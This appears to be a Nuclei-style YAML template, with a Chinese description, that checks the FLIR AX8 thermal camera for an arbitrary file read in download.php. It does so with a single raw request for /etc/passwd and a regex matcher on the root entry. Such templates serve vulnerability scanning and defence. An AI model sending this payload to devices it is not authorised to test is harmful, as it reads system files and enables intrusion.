id: flir-ax8-download-read-file

info:
  name: FLIR-AX8 download.php 任意文件读取
  author: HuanXiong
  severity: high
  description: |
    FLIR AX8红外热像仪、可见光相机集成入一种结构小巧、经济实惠的架构中，为关键机电设备的无间断状态监控提供连续的温度监控报警。
    FLIR-AX8 download.php文件过滤不全 存在任意文件下载漏洞
    app="FLIR-FLIR-AX8"

  tags: File Reading

http:
  - raw:
      - |
        GET /download.php?file=/etc/passwd HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - status_code_1==200 && regex('root:.*:0', body_1)
        condition: and
